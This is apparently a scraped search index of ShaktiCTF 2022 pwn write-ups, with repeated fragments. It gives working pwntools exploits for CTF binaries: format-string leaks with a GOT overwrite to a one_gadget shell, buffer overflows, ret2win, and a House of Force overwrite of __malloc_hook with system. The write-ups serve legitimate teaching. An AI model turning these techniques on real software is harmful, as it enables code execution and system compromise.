knight king. \"); *men = 0; } else if ( choice == 50 ) { if ( *dragons && *dragons <= 3u ) { printf(\"How many dragons would you like to use ?\\n> \"); __isoc99_scanf(\"%u\", &num); if ( num && num <= 3 ) { *dragons -= num; printf(\"%u dragon(s) have been used!\\nAre you going to kill the white walkers ?\\n> \", num); getchar(); __isoc99_scanf(\"%50[^\\n]s\", format); printf(format); } else { puts(\"You only use dragons that you have\"); exit_function(0LL); } } else { puts(\"You have too less or too many dragons! \"); exit_function(0LL); } } else { puts(\"Give a valid choice next time! \"); exit_function(0LL); } white_walkers: This function checks whether the number of men is equal to 30000 and number of dragons is equal to 200. If tru, it calls the exit_function with an argument 1 else the argument is 0 . puts(\"You are going to battle against an army of the dead! \"); if ( *a1 == 30000 || *a2 == 200 ) { puts( \"Wonderful! You have defeated the army of the dead and have conquered King's Landing. You are the true ruler of the\" \" seven kingdoms. \"); return exit_function(1LL); } else { puts(\"You do not have enough men or dragons to defeat the army of the dead\"); return exit_function(0LL); } exit_function: This function is pretty simple, if the argument is 1 it calls exit() else, it simply returns if ( arg ) exit(1); Exploitation: From the above understanding of the program, we can conclude a few things: - Since PIE and Canary are enabled, we will have to leak them using the format string bug in use_dragons . Followed by this, we can also get a libc leak in a similar fashion. The format specifier usually used to leakd addresses is %x or %p . I'll be using %p in my exploit. - Overwrite the global variables num_men and num_dragons with 30000 and 200 so as to call exit() in exit_function . We use %N to overwrite the 8 bit word, a %hn to overwrite a 4 bit word, and a %hhn to overwrite a 2 bit word. - Lastly, we shall overwrite exit_got with a one_gadget address. The address of this one_gadget can be obtained using the one_gadget tool. The libc is also provided, so there shouldn't be an issue regarding different offsets in libc. For leaking the addresses, we may simply look at the stack, i.e set a breakpoint before printf in use_dragons is called. I found the offsets for the libc , canary and code to be at 9 , 11 , and 13 . Furthermore, in order to overwrite the global variables num_dragons and num_men , the offset can be checked by spamming a few a's and then leaking the addresses to know where our input string begins. For example in this case our offset for writing can be calculated as: Are you going to kill the white walkers ? > aaaaaaaaaaaaaaa %p %p %p %p %p %p %p %p %p %p %p aaaaaaaaaaaaaaa 0xa (nil) (nil) 0x31 0x7fffffff 0x55adae26d96c 0x55adae26d928 0x7fe6934688a0 0x132310b9f 0x6161616161616161 0x2061616161616161 Since our input string aaaaaaaaaaaaaaa is found at offset 10 with 0xa beign leaked at offset 1 , we can say that everything we write onto the stack will get stored from offset 10 . Thus while overwriting, we may just keep in mind the required offset by looking into GDB and if there is any buffer needed to just align the addresses to 8 bytes. Also looking at the registers when the exit() function is finally called, I used the following libc offset for execve call: 0xe6c81 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL ```` ## Exploit: def use_dragons(data): p.sendlineafter('Your choice: ', '1') p.sendlineafter('Say something in Valyrian: ', data) s = p.recvline() leak = int(s[-15:-1], 16) return leak def kings_landing(choice, num_dragons, data): p.sendlineafter('Your choice: ', choice) p.sendline('2') p.sendlineafter('How many dragons would you like to use ?\\n> ', str(num_dragons)) p.sendlineafter('Are you going to kill the white walkers ?\\n> ', data) def white_walkers(choice): p.sendlineafter('Your choice: ', choice) from pwn import * p = process('./chall', env={\"LD_PRELOAD\":\"./libc.so.6\"}) exe = ELF('./chall') gdb.attach(p, gdbscript='b use_dragons+167\\nb kings_landing+333\\nc\\n') libc = use_dragons(\"%9$p\") - 0x95106 info('libc: %s'%hex(libc)) code = use_dragons(\"%13$p\") - 0x160a info('code: %s'%hex(code)) canary = use_dragons(\"%11$p\") info('canary: %s'%hex(canary)) num_men = code + exe.symbols['num_men'] num_dragons = code + exe.symbols['num_dragons'] exit = code + exe.got['exit'] info('num_men: %s'%hex(num_men)) info('num_dragons: %s'%hex(num_dragons)) info('exit: %s'%hex(exit)) one_gadget = libc + 0xe6c81 pay1 = '%{}p'.format(30000-4) pay1 += 'a'*4 pay1 += '%12$n' pay1 += p64(num_men) info('num_men: %s'%hex(num_men)) kings_landing('2', 1, pay1) off1 = int('0x' + hex(one_gadget)[-4:], 16)# lsb print(off1) off2 = int('0x' + hex(one_gadget)[-8:-4], 16)# msb print(off2) while(off1>off2): off2 += 0x10000 pay2 = '%{}p'.format(off1-4) pay2 += 'a' 4 pay2 += '%14$n' pay2 += '%{}p'.format(off2-off1-3) pay2 += 'b' 3 pay2 += '%15$hn' pay2 += p64(exit) pay2 += p64(exit+2) kings_landing('\\n2', 1, pay2) pay3 = '%{}p'.format(200-6) pay3 += 'c'*6 pay3 += '%12$n' pay3 += p64(num_dragons) kings_landing('\\n2', 1, pay3) white_walkers('\\n3') p.interactive() ```","title":"game_of_thrones"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#game_of_thrones","text":"Author: d1g174l_f0rtr355 Solves: 10 Difficulty: Medium","title":"game_of_thrones"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#preliminary-analysis","text":"As we can see, the binary given to us is a 64-bit non-stripped file with the following checks enabled. Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Since all the basic security checks are enabled, there is little we can do to think about the approach. Hence let's start debugging and analyzing. One may make of the decompilers such as Ghidra/ IDA to decompile the binary as there was no source code given at the time of the CTF. I have used IDA in my decompilation.","title":"Preliminary Analysis:"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#understanding-the-challenge","text":"At first glance we find a few functions present in the binary such as use_dragons , kings_landing , and white_walkers that are of interest to us. Let's take a look at each of these functions to understand what is going on. use_dragons: Upon entering option 1 , main redirects us to this function where we observe a very crucial fortmat string bug in the program. This happens beacuse printf usually takes in 2 arguments. The first one being a format specifier, and the second one being the variable whose data or address needs to be printed out. Looking at the decompiled code below it is obvious that since the only argument given to printf() is the varible buffer which is user controlled, we can very well take advantage of this bug and cause various memory leaks in the program. However, since we are only taking 10 characters of input string, it may not be enough to overwrite any data. printf(\"\\n\\nYou currently have %d number of dragons.\\n\", 3LL); printf(\"\\nSay something in Valyrian: \"); __isoc99_scanf(\"%10s\", buffer); getchar(); printf(\"The dragons say: \"); printf(buffer); return 3LL; kings_landing: This function presents us with a switch case like scenario, wherein if we choose option 1 , we simply get a message saying No men left in the army! You cannot kill the knight king. and the men is made 0. However, option 2 , firstly checks if the dragons count is between 1 and 3, if so it then asks us how many dragons we wish to use. Here we find another similar format_string type bug. This time we can also read in more characters (upto 50). if ( choice == 49 ) { puts(\"No men left in the army! You cannot kill the knight king. \"); *men = 0; } else if ( choice == 50 ) { if ( *dragons && *dragons <= 3u ) { printf(\"How many dragons would you like to use ?\\n> \"); __isoc99_scanf(\"%u\", &num); if ( num && num <= 3 ) { *dragons -= num; printf(\"%u dragon(s) have been used!\\nAre you going to kill the white walkers ?\\n> \", num); getchar(); __isoc99_scanf(\"%50[^\\n]s\", format); printf(format); } else { puts(\"You only use dragons that you have\"); exit_function(0LL); } } else { puts(\"You have too less or too many dragons! \"); exit_function(0LL); } } else { puts(\"Give a valid choice next time! \"); exit_function(0LL); } white_walkers: This function checks whether the number of men is equal to 30000 and number of dragons is equal to 200. If tru, it calls the exit_function with an argument 1 else the argument is 0 . puts(\"You are going to battle against an army of the dead! \"); if ( *a1 == 30000 || *a2 == 200 ) { puts( \"Wonderful! You have defeated the army of the dead and have conquered King's Landing. You are the true ruler of the\" \" seven kingdoms. \"); return exit_function(1LL); } else { puts(\"You do not have enough men or dragons to defeat the army of the dead\"); return exit_function(0LL); } exit_function: This function is pretty simple, if the argument is 1 it calls exit() else, it simply returns if ( arg ) exit(1);","title":"Understanding the challenge"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#exploitation","text":"From the above understanding of the program, we can conclude a few things: - Since PIE and Canary are enabled, we will have to leak them using the format string bug in use_dragons . Followed by this, we can also get a libc leak in a similar fashion. The format specifier usually used to leakd addresses is %x or %p . I'll be using %p in my exploit. - Overwrite the global variables num_men and num_dragons with 30000 and 200 so as to call exit() in exit_function . We use %N to overwrite the 8 bit word, a %hn to overwrite a 4 bit word, and a %hhn to overwrite a 2 bit word. - Lastly, we shall overwrite exit_got with a one_gadget address. The address of this one_gadget can be obtained using the one_gadget tool. The libc is also provided, so there shouldn't be an issue regarding different offsets in libc. For leaking the addresses, we may simply look at the stack, i.e set a breakpoint before printf in use_dragons is called. I found the offsets for the libc , canary and code to be at 9 , 11 , and 13 . Furthermore, in order to overwrite the global variables num_dragons and num_men , the offset can be checked by spamming a few a's and then leaking the addresses to know where our input string begins. For example in this case our offset for writing can be calculated as: Are you going to kill the white walkers ? > aaaaaaaaaaaaaaa %p %p %p %p %p %p %p %p %p %p %p aaaaaaaaaaaaaaa 0xa (nil) (nil) 0x31 0x7fffffff 0x55adae26d96c 0x55adae26d928 0x7fe6934688a0 0x132310b9f 0x6161616161616161 0x2061616161616161 Since our input string aaaaaaaaaaaaaaa is found at offset 10 with 0xa beign leaked at offset 1 , we can say that everything we write onto the stack will get stored from offset 10 . Thus while overwriting, we may just keep in mind the required offset by looking into GDB and if there is any buffer needed to just align the addresses to 8 bytes. Also looking at the registers when the exit() function is finally called, I used the following libc offset for execve call: 0xe6c81 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL ```` ## Exploit: def use_dragons(data): p.sendlineafter('Your choice: ', '1') p.sendlineafter('Say something in Valyrian: ', data) s = p.recvline() leak = int(s[-15:-1], 16) return leak def kings_landing(choice, num_dragons, data): p.sendlineafter('Your choice: ', choice) p.sendline('2') p.sendlineafter('How many dragons would you like to use ?\\n> ', str(num_dragons)) p.sendlineafter('Are you going to kill the white walkers ?\\n> ', data) def white_walkers(choice): p.sendlineafter('Your choice: ', choice) from pwn import * p = process('./chall', env={\"LD_PRELOAD\":\"./libc.so.6\"}) exe = ELF('./chall') gdb.attach(p, gdbscript='b use_dragons+167\\nb kings_landing+333\\nc\\n') libc = use_dragons(\"%9$p\") - 0x95106 info('libc: %s'%hex(libc)) code = use_dragons(\"%13$p\") - 0x160a info('code: %s'%hex(code)) canary = use_dragons(\"%11$p\") info('canary: %s'%hex(canary)) num_men = code + exe.symbols['num_men'] num_dragons = code + exe.symbols['num_dragons'] exit = code + exe.got['exit'] info('num_men: %s'%hex(num_men)) info('num_dragons: %s'%hex(num_dragons)) info('exit: %s'%hex(exit)) one_gadget = libc + 0xe6c81 pay1 = '%{}p'.format(30000-4) pay1 += 'a'*4 pay1 += '%12$n' pay1 += p64(num_men)","title":"Exploitation:"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#infonum_men-shexnum_men","text":"kings_landing('2', 1, pay1) off1 = int('0x' + hex(one_gadget)[-4:], 16)# lsb","title":"info('num_men: %s'%hex(num_men))"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#printoff1","text":"off2 = int('0x' + hex(one_gadget)[-8:-4], 16)# msb","title":"print(off1)"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/#printoff2","text":"while(off1>off2): off2 += 0x10000 pay2 = '%{}p'.format(off1-4) pay2 += 'a' 4 pay2 += '%14$n' pay2 += '%{}p'.format(off2-off1-3) pay2 += 'b' 3 pay2 += '%15$hn' pay2 += p64(exit) pay2 += p64(exit+2) kings_landing('\\n2', 1, pay2) pay3 = '%{}p'.format(200-6) pay3 += 'c'*6 pay3 += '%12$n' pay3 += p64(num_dragons) kings_landing('\\n2', 1, pay3) white_walkers('\\n3') p.interactive() ```","title":"print(off2)"},{"location":"ShaktiCTF22/pwn/guess_the_key/writeup/","text":"Shaktictf 22 write-ups Guess the key DESCRIPTION: Guess the correct key to win! Note:The server is running on Ubuntu 20.04. Author: Claire de lune FLAG FORMAT: shakti{} Intended solution This is a basic variable overwrite challenge. A binary file is given as an attachment, where the usual checks give: Running the file- Decompiling the func fuction in binary gives the following- int func() { char v1[60]; // [rsp+0h] [rbp-40h] BYREF int v2; // [rsp+3Ch] [rbp-4h] puts(\"Guess the correct key to win!\"); v2 = -559038737; printf(\"Enter the key: \"); gets(v1); if ( v2 == -889275714 ) return system(\"cat flag.txt\"); puts(\"Wrong Key\"); return puts(\"Try again!\"); } Here '-559038737' is 0xdeadbeef and '-889275714' is 0xcafebabe .We have to overwrite the variable v2 to 0xcafebabe to pass the check and cat flag. There is a gets function present in func(). So we can we can overfow the buffer and then access v2 through that. On the stack, the size of v1 is 60 bytes, in order to overwrite v2, we must overflow v1 with 60 bytes of junk data and then overwrite v1 with 0xcafebabe Exploit: python= (from pwn import * elf = ELF(\"variable\") io = process(elf.path) payload =b'a'*60 + p64(0xcafebabe) io.sendline(payload) io.interactive() This gives us the flag: shakti{0verWr171ng_15_FuN}","title":"Shaktictf 22 write-ups"},{"location":"ShaktiCTF22/pwn/guess_the_key/writeup/#shaktictf-22-write-ups","text":"","title":"Shaktictf 22 write-ups"},{"location":"ShaktiCTF22/pwn/guess_the_key/writeup/#guess-the-key","text":"DESCRIPTION: Guess the correct key to win! Note:The server is running on Ubuntu 20.04. Author: Claire de lune FLAG FORMAT: shakti{}","title":"Guess the key"},{"location":"ShaktiCTF22/pwn/guess_the_key/writeup/#intended-solution","text":"This is a basic variable overwrite challenge. A binary file is given as an attachment, where the usual checks give: Running the file- Decompiling the func fuction in binary gives the following- int func() { char v1[60]; // [rsp+0h] [rbp-40h] BYREF int v2; // [rsp+3Ch] [rbp-4h] puts(\"Guess the correct key to win!\"); v2 = -559038737; printf(\"Enter the key: \"); gets(v1); if ( v2 == -889275714 ) return system(\"cat flag.txt\"); puts(\"Wrong Key\"); return puts(\"Try again!\"); } Here '-559038737' is 0xdeadbeef and '-889275714' is 0xcafebabe .We have to overwrite the variable v2 to 0xcafebabe to pass the check and cat flag. There is a gets function present in func(). So we can we can overfow the buffer and then access v2 through that. On the stack, the size of v1 is 60 bytes, in order to overwrite v2, we must overflow v1 with 60 bytes of junk data and then overwrite v1 with 0xcafebabe Exploit: python= (from pwn import * elf = ELF(\"variable\") io = process(elf.path) payload =b'a'*60 + p64(0xcafebabe) io.sendline(payload) io.interactive() This gives us the flag: shakti{0verWr171ng_15_FuN}","title":"Intended solution"},{"location":"ShaktiCTF22/pwn/phrack_crack/writeup/","text":"phrack_crack Author: d1g174l_f0rtr355 Solves: 9 Difficulty: Hard Preliminary Analysis We notice that the binary given to us is a 64 bit non-stripped file with the following memory protections: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fe000) RUNPATH: b'./libc' We notice that a libc has also been provided. You may choose to patch the binary to the libc given. With only PIE enabled, we cannot formulate the exploit technique at first glance. So let's get an understanding of the binary. ``` GNU C Library (GNU libc) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: http://www.gnu.org/software/libc/bugs.html . Another important detail we need to notice is that the libc version provided to us is Glibc 2.27. ## Understanding the binary As we run the program, we see that we are presented with four choices: malloc 0/4 edit target quit We can allocate atmost 4 chunks on the heap. Also we notice two generous leaks given to us. One leak being the libc addres sof puts and the other a heap address as seen from the decompiled code below: printf(\"Here's a generous leak for you! %p\\n\\n\", &puts); idx = 0; ptr = malloc(0x88uLL); printf(\"Here's one more generous leak for you: %p\\n\", (char *)ptr - 64); free(ptr); while ( 1 ) { printf(\"\\nMENU\\n\\n1. malloc %u/%u\\n\", (unsigned int)idx, 4LL); Upon further decompilation of the binary, we observe that when we try to malloc() a chunk, we are asked for size and data. However the code snippet below shows that there is no check on the size of the chunk. This enables us to give a very large sized chunk evetually resulting in a Hous of Force attack since the libc version given is also 2.27. case 1: fflush(stdout); if ( idx < 0 ) { puts(\"No negative indices allowed!\"); exit(0); } if ( idx > 4 ) { puts(\"maximum requests reached!\"); exit(0); } puts(\"Enter size: \"); __isoc99_scanf(\"%ld\", &size); m_array[idx] = malloc(size); if ( !m_array[idx] ) { puts(\"request failed!\\n\"); exit(0); } puts(\"data: \"); get_inp(m_array[idx++], (unsigned int)size); break; ``` The edit() function asks for index at which we need to edit the chunk, and checks if the index is between 0-4. ## Exploitation Since there is no size check on any of the chunks, we can make use of this vulnerability to overwrite the top chunk. Furthermore, we can request a chunk of a suitable large size. Generally, our memory map looks something like this: In the above image, the binary/ code_base addresses reside at the lowest address and the stack resides at the highest address. Now think! If we overwrote the top chunk size field, then from malloc's perspective, the heap could extend across the gap overlapping sensitive data in the library or the stack region. However, we see that the target variable resides in the data section of the binary which is at a lower address than the heap. Look at the diagram below! Hence, if we overwrote a really large value into the top chunk size field, it would appear as though it extended past the virtual address space, wrapping around to the start of the memory map. Then we can make another request for malloc, overwrite the target variable in the data section. However, upon a little closer observation, we realize that overwriting the target address is eventually of no significance to us in trying to obtaina shell. Hence we shall make use the above same concept to overwrite __malloc_hook , with a pointer to system. Since __malloc_hook is internally called when trying to allocate a chunk through malloc , we see that when we try to request another chunk, system() will infact be executed. All we need to make sure is to place the string /bin/sh onto the heap. This is the concept behind the House of Force attack in the binary. Exploit def malloc(size, data): p.sendline(b'1') p.sendlineafter(b'Enter size: \\n', str(size)) p.sendlineafter(b'data: \\n', data) def edit(ind, data): p.sendline(b'2') p.sendlineafter(b'Enter index: \\n', str(ind)) p.sendlineafter(b'data: \\n', data) from pwn import * p = process('./phrack_crack') gdb.attach(p) p.recvuntil('! ') libc = int(p.recvline()[:-1], 16) info('libc: %s'%hex(libc)) p.recvuntil(\"Here's one more generous leak for you: \") heap = int(p.recvline()[:-1], 16) - 0x630 info('heap: %s'%hex(heap)) # malloc malloc(24, b'a'*20) edit(0, b'b'*24 + p64(0xffffffffffffffff)) libc_base = libc - 0x6dba0 malloc_hook = libc_base + 0x3aec30 system = libc_base + 0x41710 binsh = libc_base + 0x175e93 dist = (malloc_hook - 0x10) - (heap + 0x1710 + 0x20) info('dist: %s'%hex(dist)) malloc(dist, b'c') malloc(30, p64(system)) p.sendline(b'1') p.sendlineafter(b'Enter size: \\n', str(binsh)) p.interactive()","title":"phrack_crack"},{"location":"ShaktiCTF22/pwn/phrack_crack/writeup/#phrack_crack","text":"Author: d1g174l_f0rtr355 Solves: 9 Difficulty: Hard","title":"phrack_crack"},{"location":"ShaktiCTF22/pwn/phrack_crack/writeup/#preliminary-analysis","text":"We notice that the binary given to us is a 64 bit non-stripped file with the following memory protections: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fe000) RUNPATH: b'./libc' We notice that a libc has also been provided. You may choose to patch the binary to the libc given. With only PIE enabled, we cannot formulate the exploit technique at first glance. So let's get an understanding of the binary. ``` GNU C Library (GNU libc) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: http://www.gnu.org/software/libc/bugs.html . Another important detail we need to notice is that the libc version provided to us is Glibc 2.27. ## Understanding the binary As we run the program, we see that we are presented with four choices: malloc 0/4 edit target quit We can allocate atmost 4 chunks on the heap. Also we notice two generous leaks given to us. One leak being the libc addres sof puts and the other a heap address as seen from the decompiled code below: printf(\"Here's a generous leak for you! %p\\n\\n\", &puts); idx = 0; ptr = malloc(0x88uLL); printf(\"Here's one more generous leak for you: %p\\n\", (char *)ptr - 64); free(ptr); while ( 1 ) { printf(\"\\nMENU\\n\\n1. malloc %u/%u\\n\", (unsigned int)idx, 4LL); Upon further decompilation of the binary, we observe that when we try to malloc() a chunk, we are asked for size and data. However the code snippet below shows that there is no check on the size of the chunk. This enables us to give a very large sized chunk evetually resulting in a Hous of Force attack since the libc version given is also 2.27. case 1: fflush(stdout); if ( idx < 0 ) { puts(\"No negative indices allowed!\"); exit(0); } if ( idx > 4 ) { puts(\"maximum requests reached!\"); exit(0); } puts(\"Enter size: \"); __isoc99_scanf(\"%ld\", &size); m_array[idx] = malloc(size); if ( !m_array[idx] ) { puts(\"request failed!\\n\"); exit(0); } puts(\"data: \"); get_inp(m_array[idx++], (unsigned int)size); break; ``` The edit() function asks for index at which we need to edit the chunk, and checks if the index is between 0-4. ## Exploitation Since there is no size check on any of the chunks, we can make use of this vulnerability to overwrite the top chunk. Furthermore, we can request a chunk of a suitable large size. Generally, our memory map looks something like this: In the above image, the binary/ code_base addresses reside at the lowest address and the stack resides at the highest address. Now think! If we overwrote the top chunk size field, then from malloc's perspective, the heap could extend across the gap overlapping sensitive data in the library or the stack region. However, we see that the target variable resides in the data section of the binary which is at a lower address than the heap. Look at the diagram below! Hence, if we overwrote a really large value into the top chunk size field, it would appear as though it extended past the virtual address space, wrapping around to the start of the memory map. Then we can make another request for malloc, overwrite the target variable in the data section. However, upon a little closer observation, we realize that overwriting the target address is eventually of no significance to us in trying to obtaina shell. Hence we shall make use the above same concept to overwrite __malloc_hook , with a pointer to system. Since __malloc_hook is internally called when trying to allocate a chunk through malloc , we see that when we try to request another chunk, system() will infact be executed. All we need to make sure is to place the string /bin/sh onto the heap. This is the concept behind the House of Force attack in the binary.","title":"Preliminary Analysis"},{"location":"ShaktiCTF22/pwn/phrack_crack/writeup/#exploit","text":"def malloc(size, data): p.sendline(b'1') p.sendlineafter(b'Enter size: \\n', str(size)) p.sendlineafter(b'data: \\n', data) def edit(ind, data): p.sendline(b'2') p.sendlineafter(b'Enter index: \\n', str(ind)) p.sendlineafter(b'data: \\n', data) from pwn import * p = process('./phrack_crack') gdb.attach(p) p.recvuntil('! ') libc = int(p.recvline()[:-1], 16) info('libc: %s'%hex(libc)) p.recvuntil(\"Here's one more generous leak for you: \") heap = int(p.recvline()[:-1], 16) - 0x630 info('heap: %s'%hex(heap)) # malloc malloc(24, b'a'*20) edit(0, b'b'*24 + p64(0xffffffffffffffff)) libc_base = libc - 0x6dba0 malloc_hook = libc_base + 0x3aec30 system = libc_base + 0x41710 binsh = libc_base + 0x175e93 dist = (malloc_hook - 0x10) - (heap + 0x1710 + 0x20) info('dist: %s'%hex(dist)) malloc(dist, b'c') malloc(30, p64(system)) p.sendline(b'1') p.sendlineafter(b'Enter size: \\n', str(binsh)) p.interactive()","title":"Exploit"},{"location":"ShaktiCTF22/pwn/play_to_win/writeup/","text":"Shaktictf 22 writeups Play to win DESCRIPTION: I was playing a game of adding words with my friends, until I added one too long! Note: The server is running on Ubuntu 20.04. FLAG FORMAT: shakti{} Intended solution: This is a basic ret2win challenge. A binary file is given as an attachment, where the usual checks give: Running the file- Decompiling the game fuction in binary gives the following- int game() { int result; // eax int v1; // eax char v2[2]; // [rsp+8h] [rbp-18h] BYREF char s[10]; // [rsp+Ah] [rbp-16h] BYREF int v4; // [rsp+14h] [rbp-Ch] int v5; // [rsp+18h] [rbp-8h] int v6; // [rsp+1Ch] [rbp-4h] puts(\"You think you can do this?\"); result = puts(\"I don't think so.\"); v5 = 0; v4 = 0; while ( v5 != 1 ) { printf(\"Add the word:\"); gets(s); //gets function here! v1 = strlen(s); result = v1 + v4; v4 = result; if ( result == 10000 ) { v5 = 1; v6 = 1; break; } puts(\"Do you want to continue?\"); printf(\"Yes or No [y/n]:\"); __isoc99_scanf(\"%s\", v2); getchar(); result = (unsigned __int8)v2[0]; if ( v2[0] == 121 || (result = (unsigned __int8)v2[0], v2[0] == 89) ) { v5 = 0; } else { result = (unsigned __int8)v2[0]; if ( v2[0] == 110 || (result = (unsigned __int8)v2[0], v2[0] == 78) ) v5 = 1; else result = puts(\"Wrong input.\"); } } if ( v6 == 1 ) { winfunc(); exit(0); } return result; } The basic objective of the game is to add words till the combined length of them all reaches 10000, upon which the game re-directs to a winfunc(), where it prints : ``` Ah well, you did win afterall. I guess congratlations are in order. On opening the file in gdb and observing all the functions- ![](https://i.imgur.com/hBilDaC.png) We see that there are two win fuctions here, winfunc and reallywin.And reallywin shows: void __noreturn reallywin() { puts(\"I may have underestimated you\"); puts(\"You win!\"); system(\"cat flag.txt\"); exit(0); } So basically you just have to redirect the control flow of the rip to reallywin. We have a gets fuction here, so we can overflow and overwrite rip. Now as stack is 16 bit aligned, it took 30 bytes of data to overwrite the buffer and we have to use the ret gadget to return back to the stack and overwrite rip with address of `reallywin` Exploit: ```python from pwn import * elf = ELF(\"game\") io=process(elf.path) ret = 0x40101a # Used to align stack win = elf.symbols['reallywin'] #Fill the Buffer with 30 A's --> overwrite return address with ret gadget to align the stack --> then address of the reallywin function payload = b\"A\"*30 + p64(ret) + p64(win) r.sendline(payload) r.sendline(n) #to pass last check r.interactive() This gives the flag: shakti{G0od_joB_5olviNg_Thi5_1}","title":"Shaktictf 22 writeups"},{"location":"ShaktiCTF22/pwn/play_to_win/writeup/#shaktictf-22-writeups","text":"","title":"Shaktictf 22 writeups"},{"location":"ShaktiCTF22/pwn/play_to_win/writeup/#play-to-win","text":"DESCRIPTION: I was playing a game of adding words with my friends, until I added one too long! Note: The server is running on Ubuntu 20.04. FLAG FORMAT: shakti{}","title":"Play to win"},{"location":"ShaktiCTF22/pwn/play_to_win/writeup/#intended-solution","text":"This is a basic ret2win challenge. A binary file is given as an attachment, where the usual checks give: Running the file- Decompiling the game fuction in binary gives the following- int game() { int result; // eax int v1; // eax char v2[2]; // [rsp+8h] [rbp-18h] BYREF char s[10]; // [rsp+Ah] [rbp-16h] BYREF int v4; // [rsp+14h] [rbp-Ch] int v5; // [rsp+18h] [rbp-8h] int v6; // [rsp+1Ch] [rbp-4h] puts(\"You think you can do this?\"); result = puts(\"I don't think so.\"); v5 = 0; v4 = 0; while ( v5 != 1 ) { printf(\"Add the word:\"); gets(s); //gets function here! v1 = strlen(s); result = v1 + v4; v4 = result; if ( result == 10000 ) { v5 = 1; v6 = 1; break; } puts(\"Do you want to continue?\"); printf(\"Yes or No [y/n]:\"); __isoc99_scanf(\"%s\", v2); getchar(); result = (unsigned __int8)v2[0]; if ( v2[0] == 121 || (result = (unsigned __int8)v2[0], v2[0] == 89) ) { v5 = 0; } else { result = (unsigned __int8)v2[0]; if ( v2[0] == 110 || (result = (unsigned __int8)v2[0], v2[0] == 78) ) v5 = 1; else result = puts(\"Wrong input.\"); } } if ( v6 == 1 ) { winfunc(); exit(0); } return result; } The basic objective of the game is to add words till the combined length of them all reaches 10000, upon which the game re-directs to a winfunc(), where it prints : ``` Ah well, you did win afterall. I guess congratlations are in order. On opening the file in gdb and observing all the functions- ![](https://i.imgur.com/hBilDaC.png) We see that there are two win fuctions here, winfunc and reallywin.And reallywin shows: void __noreturn reallywin() { puts(\"I may have underestimated you\"); puts(\"You win!\"); system(\"cat flag.txt\"); exit(0); } So basically you just have to redirect the control flow of the rip to reallywin. We have a gets fuction here, so we can overflow and overwrite rip. Now as stack is 16 bit aligned, it took 30 bytes of data to overwrite the buffer and we have to use the ret gadget to return back to the stack and overwrite rip with address of `reallywin` Exploit: ```python from pwn import * elf = ELF(\"game\") io=process(elf.path) ret = 0x40101a # Used to align stack win = elf.symbols['reallywin'] #Fill the Buffer with 30 A's --> overwrite return address with ret gadget to align the stack --> then address of the reallywin function payload = b\"A\"*30 + p64(ret) + p64(win) r.sendline(payload) r.sendline(n) #to pass last check r.interactive() This gives the flag: shakti{G0od_joB_5olviNg_Thi5_1}","title":"Intended solution:"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/","text":"racing_cars Author: d1g174l_f0rtr355 Solves: 2 Difficulty: Medium This is one of the heap challenges I made for ShaktiCTF'22. The binary provided is a stripped binary, making it difficult. However useful decompilers such as Ghidra/ IDA make it easy to debug and decompile. Preliminary Checks: We observe that the binary given is a 32 bit stripped binary with the following cheks enabled and disabled: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments One key security check to note here is that the NX bit is disabled. This makes it easy for us to inject a shellcode and execute it. However the question is how? Understanding the challenge For the purpose of understanding, let's take a look at the source code which was also released during the CTF. We notice a few things such as: - structure node: This node contains an interger id , a char buffer and two other nodes pointers namely, next , and prev . struct node{ int id; char buffer[32]; struct node* next; struct node* prev; }; - insert: Here, the node temp is a pointer that contaoins the malloced chunk. The size allocated is 0x30 bytes, as can be seen in GDB (set a break point at 0x8049391 where malloc() is called, and check the heap address present in the eax register after calling malloc()). We also observe that the pointer to the next chunk of the current chunk is nulled out. This function is responsible for inserting the current node onto the heap. int insert(int id){ struct node *temp = malloc(sizeof(struct node)); temp->next = NULL; temp->id = id; if(head==NULL){ head = temp; head->prev = NULL; return 1; } struct node *iter = head; while(iter->next != NULL){ iter = iter->next; } iter->next = temp; temp->prev = iter; return 1; } pwndbg> x/20x 0x804d1a0-0x8 0x804d198: 0x00000000 0x00000031 0x00000000 0x00000000 0x804d1a8: 0x00000000 0x00000000 0x00000000 0x00000000 0x804d1b8: 0x00000000 0x00000000 0x00000000 0x00000000 0x804d1c8: 0x00000000 0x00021e39 0x00000000 0x00000000 0x804d1d8: 0x00000000 0x00000000 0x00000000 0x00000000 pwndbg> - delete: This function is responsible for freeing an allocated chunk. The freeing process is similar to that in unlink where upon freeing a current chunk, its forward and backward pointers point to the current chunk's forward and backward chunks. int delete(int id){ struct node *temp = head; while(temp->id != id && temp->next != NULL) temp = temp->next; if(temp==NULL) return 0; if(temp->next == NULL) temp->prev->next = NULL; if(temp->prev == NULL) temp->next->prev = NULL; if(temp->next != NULL && temp->prev != NULL){ temp->prev->next = temp->next; temp->next->prev = temp->prev; } free(temp); return 0; } - main: Here we see an input taken into the global variable array with our input size being 50. This is where we shall place our shellcode for program redirection. Further we see that 3 chunks are being allocated on heap (through insert()). The chunks are read from the get_name() function where we observe the overflow happening. The order the chunks are being read in and the index of the chunk which is deleted is of importance to check. 